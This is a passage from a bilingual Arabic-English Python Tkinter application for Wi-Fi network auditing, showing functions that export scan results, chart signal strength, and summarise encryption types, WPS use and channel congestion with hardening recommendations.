                        f.write(f"الإشارة | Signal: {net['signal']} dBm\n")
                        f.write(f"الحماية | Security: {net['security']}\n")
                        f.write(f"WPS: {net['wps']}\n")
                        f.write("\n")
            
            self.log(f"💾 تم التصدير إلى | Exported to: {filename}\n")
            messagebox.showinfo("نجح - Success", f"تم التصدير بنجاح!\nExported successfully!\n\n{filename}")
            
        except Exception as e:
            self.log(f"❌ خطأ في التصدير | Export error: {str(e)}\n")
            messagebox.showerror("خطأ - Error", f"فشل التصدير\nExport failed\n\n{str(e)}")
            
    def show_signal_chart(self):
        """Show signal strength chart"""
        if not self.networks:
            messagebox.showwarning("تحذير - Warning", 
                                 "لا توجد بيانات للعرض\nNo data to display")
            return
            
        try:
            import matplotlib
            matplotlib.use('TkAgg')
            import matplotlib.pyplot as plt
            from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
            
            # Create chart window
            chart_window = tk.Toplevel(self.root)
            chart_window.title("رسم بياني لقوة الإشارة | Signal Strength Chart")
            chart_window.geometry("900x600")
            chart_window.configure(bg='#2c3e50')
            
            # Prepare data
            ssids = []
            signals = []
            colors = []
            
            for net in self.networks[:15]:  # Top 15 networks
                ssid = net['ssid'][:20] if len(net['ssid']) > 20 else net['ssid']
                ssids.append(ssid)
                
                try:
                    signal = int(net['signal'])
                    signals.append(signal)
                    
                    # Color based on signal strength
                    if signal > -60:
                        colors.append('#27ae60')  # Green - Strong
                    elif signal > -70:
                        colors.append('#f39c12')  # Orange - Medium
                    else:
                        colors.append('#e74c3c')  # Red - Weak
                except:
                    signals.append(-90)
                    colors.append('#95a5a6')
            
            # Create figure
            fig, ax = plt.subplots(figsize=(10, 6))
            fig.patch.set_facecolor('#2c3e50')
            ax.set_facecolor('#34495e')
            
            bars = ax.barh(ssids, signals, color=colors, edgecolor='white', linewidth=0.5)
            
            # Styling
            ax.set_xlabel('قوة الإشارة (dBm) | Signal Strength (dBm)', 
                         fontsize=12, color='white', fontweight='bold')
            ax.set_title('تحليل قوة الإشارة للشبكات\nNetwork Signal Strength Analysis', 
                        fontsize=14, color='white', fontweight='bold', pad=20)
            ax.tick_params(colors='white')
            ax.spines['bottom'].set_color('white')
            ax.spines['left'].set_color('white')
            ax.spines['top'].set_visible(False)
            ax.spines['right'].set_visible(False)
            
            # Add value labels
            for i, (bar, signal) in enumerate(zip(bars, signals)):
                ax.text(signal - 2, i, f'{signal} dBm', 
                       va='center', ha='right', color='white', fontsize=9, fontweight='bold')
            
            # Add legend
            from matplotlib.patches import Patch
            legend_elements = [
                Patch(facecolor='#27ae60', label='قوية | Strong (> -60 dBm)'),
                Patch(facecolor='#f39c12', label='متوسطة | Medium (-60 to -70 dBm)'),
                Patch(facecolor='#e74c3c', label='ضعيفة | Weak (< -70 dBm)')
            ]
            ax.legend(handles=legend_elements, loc='lower right', 
                     facecolor='#34495e', edgecolor='white', 
                     labelcolor='white', fontsize=9)
            
            plt.tight_layout()
            
            # Embed in tkinter
            canvas = FigureCanvasTkAgg(fig, master=chart_window)
            canvas.draw()
            canvas.get_tk_widget().pack(fill='both', expand=True, padx=10, pady=10)
            
            # Close button
            tk.Button(
                chart_window,
                text="إغلاق | Close",
                command=chart_window.destroy,
                bg='#e74c3c',
                fg='white',
                font=('Arial', 11, 'bold'),
                cursor='hand2'
            ).pack(pady=10)
            
            self.log("📊 تم عرض الرسم البياني | Chart displayed\n")
            
        except ImportError:
            messagebox.showerror("خطأ - Error", 
                               "يتطلب matplotlib\nRequires matplotlib\n\nsudo pip3 install matplotlib")
        except Exception as e:
            self.log(f"❌ خطأ في عرض الرسم | Chart error: {str(e)}\n")
            messagebox.showerror("خطأ - Error", f"فشل عرض الرسم\nChart failed\n\n{str(e)}")
            
    def analyze_security(self):
        """Analyze security types"""
        if not self.networks:
            messagebox.showwarning("تحذير - Warning", 
                                 "لا توجد بيانات للتحليل\nNo data to analyze")
            return
            
        self.stats_text.delete('1.0', tk.END)
        
        # Security type statistics
        security_types = {}
        wps_count = 0
        open_networks = 0
        weak_encryption = 0
        
        for net in self.networks:
            sec = net['security']
            if sec in security_types:
                security_types[sec] += 1
            else:
                security_types[sec] = 1
                
            if net['wps'] == 'Yes':
                wps_count += 1
            if sec == 'Open':
                open_networks += 1
            if 'WEP' in sec or sec == 'Open':
                weak_encryption += 1
        
        # Channel distribution
        channels = {}
        for net in self.networks:
            ch = net['channel']
            channels[ch] = channels.get(ch, 0) + 1
        
        # Signal strength distribution
        strong = sum(1 for n in self.networks if int(n['signal']) > -60)
        medium = sum(1 for n in self.networks if -70 < int(n['signal']) <= -60)
        weak = sum(1 for n in self.networks if int(n['signal']) <= -70)
        
        # Display analysis
        self.stats_text.insert(tk.END, "=" * 80 + "\n")
        self.stats_text.insert(tk.END, "تحليل أمان الشبكات | Network Security Analysis\n")
        self.stats_text.insert(tk.END, "=" * 80 + "\n\n")
        
        self.stats_text.insert(tk.END, f"إجمالي الشبكات | Total Networks: {len(self.networks)}\n")
        self.stats_text.insert(tk.END, f"وقت التحليل | Analysis Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        
        self.stats_text.insert(tk.END, "━" * 80 + "\n")
        self.stats_text.insert(tk.END, "📊 توزيع أنواع التشفير | Encryption Types Distribution\n")
        self.stats_text.insert(tk.END, "━" * 80 + "\n\n")
        
        for sec_type, count in sorted(security_types.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / len(self.networks)) * 100
            bar = "█" * int(percentage / 2)
            self.stats_text.insert(tk.END, f"{sec_type:20} : {count:3} ({percentage:5.1f}%)  {bar}\n")
        
        self.stats_text.insert(tk.END, "\n" + "━" * 80 + "\n")
        self.stats_text.insert(tk.END, "⚠️ تحذيرات أمنية | Security Warnings\n")
        self.stats_text.insert(tk.END, "━" * 80 + "\n\n")
        
        if open_networks > 0:
            self.stats_text.insert(tk.END, f"🔓 شبكات مفتوحة | Open Networks: {open_networks}\n")
            self.stats_text.insert(tk.END, "   ⚠️ هذه الشبكات غير آمنة!\n\n")
            
        if weak_encryption > 0:
            self.stats_text.insert(tk.END, f"⚠️  تشفير ضعيف | Weak Encryption: {weak_encryption}\n")
            self.stats_text.insert(tk.END, "   ⚠️ يوصى بالترقية إلى WPA2/WPA3\n\n")
            
        if wps_count > 0:
            self.stats_text.insert(tk.END, f"🔐 WPS مفعل | WPS Enabled: {wps_count}\n")
            self.stats_text.insert(tk.END, "   ⚠️ قد يكون عرضة للهجمات\n\n")
        
        self.stats_text.insert(tk.END, "━" * 80 + "\n")
        self.stats_text.insert(tk.END, "📡 توزيع قوة الإشارة | Signal Strength Distribution\n")
        self.stats_text.insert(tk.END, "━" * 80 + "\n\n")
        
        self.stats_text.insert(tk.END, f"قوية (> -60 dBm)    | Strong : {strong:3} "
                              f"({strong/len(self.networks)*100:.1f}%)\n")
        self.stats_text.insert(tk.END, f"متوسطة (-60 to -70) | Medium : {medium:3} "
                              f"({medium/len(self.networks)*100:.1f}%)\n")
        self.stats_text.insert(tk.END, f"ضعيفة (< -70 dBm)   | Weak   : {weak:3} "
                              f"({weak/len(self.networks)*100:.1f}%)\n\n")
        
        self.stats_text.insert(tk.END, "━" * 80 + "\n")
        self.stats_text.insert(tk.END, "📻 توزيع القنوات | Channel Distribution\n")
        self.stats_text.insert(tk.END, "━" * 80 + "\n\n")
        
        for ch, count in sorted(channels.items(), key=lambda x: int(x[0]) if x[0].isdigit() else 999):
            percentage = (count / len(self.networks)) * 100
            bar = "█" * int(percentage / 2)
            self.stats_text.insert(tk.END, f"قناة | Channel {ch:3} : {count:3} ({percentage:5.1f}%)  {bar}\n")
        
        self.stats_text.insert(tk.END, "\n" + "=" * 80 + "\n")
        self.stats_text.insert(tk.END, "📋 توصيات | Recommendations\n")
        self.stats_text.insert(tk.END, "=" * 80 + "\n\n")
        
        recommendations = []
        if open_networks > 0:
            recommendations.append("• فعّل التشفير على الشبكات المفتوحة | Enable encryption on open networks")
        if weak_encryption > 0:
            recommendations.append("• حدّث إلى WPA2 أو WPA3 | Upgrade to WPA2 or WPA3")
        if wps_count > 0:
            recommendations.append("• عطّل WPS إذا لم تكن تستخدمه | Disable WPS if not in use")
        
        # Channel congestion
        max_channel_usage = max(channels.values()) if channels else 0
        if max_channel_usage > len(self.networks) * 0.3:
            recommendations.append("• بعض القنوات مزدحمة، غيّر القناة | Some channels are congested, change channel")
        
        if recommendations:
            for rec in recommendations:
                self.stats_text.insert(tk.END, rec + "\n")
        else:
            self.stats_text.insert(tk.END, "✅ لم يتم العثور على مشاكل أمنية واضحة\n")
            self.stats_text.insert(tk.END, "✅ No obvious security issues found\n")
        
        self.stats_text.insert(tk.END, "\n" + "=" * 80 + "\n")
        
        # Switch to analytics tab
        self.notebook.select(self.analytics_tab)
        
        self.log("📊 اكتمل تحليل الأمان | Security analysis completed\n")
        
    def clear_output(self):
        """Clear output text"""
        self.output_text.delete('1.0', tk.END)
        self.tree.delete(*self.tree.get_children())
        self.networks = []
        self.selected_network = None
        self.info_label.config(text="لم يتم اختيار شبكة - No network selected")
        
    def log(self, message):
        """Log message to output"""
        self.output_text.insert(tk.END, f"{message}")
        self.output_text.see(tk.END)
        self.root.update()
        
    def update_status(self, message):
        """Update status bar"""
        self.status_bar.config(text=message)
        self.root.update()

def main():
    # Check if running as root
    if os.geteuid() != 0:
        print("=" * 80)
        print("⚠️  تحذير: بعض المميزات تحتاج صلاحيات root")
        print("⚠️  Warning: Some features require root privileges")
        print("=" * 80)
        print("\nيُنصح بالتشغيل باستخدام:")
        print("Recommended to run with:")
        print("\n    sudo python3 wifi_security_tool_advanced.py\n")
        print("=" * 80 + "\n")
        
        response = input("هل تريد المتابعة؟ Continue anyway? (y/n): ")
        if response.lower() != 'y':
            return
        
    root = tk.Tk()
    app = WiFiSecurityToolAdvanced(root)
    root.mainloop()

if __name__ == "__main__":
    main()
